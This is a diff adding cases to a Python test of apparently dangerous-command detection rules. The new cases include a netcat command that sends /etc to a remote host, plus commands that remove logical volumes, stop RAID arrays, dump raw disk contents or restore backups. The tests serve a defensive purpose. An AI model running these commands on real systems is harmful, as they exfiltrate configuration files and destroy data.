@@ -602,6 +602,11 @@ class TestSafetyChecks:
             ("fwupdmgr downgrade firmware\n", "SEC-478"),
             ("systemctl restart acpid.service\n", "SEC-479"),
             ("tpm2_clear\n", "SEC-480"),
+            ("tar /etc | nc host 4444\n", "SEC-481"),
+            ("lvremove /dev/vg0/lv\n", "SEC-482"),
+            ("mdadm --stop /dev/md0\n", "SEC-483"),
+            ("strings /dev/sda\n", "SEC-484"),
+            ("restic restore latest\n", "SEC-485"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
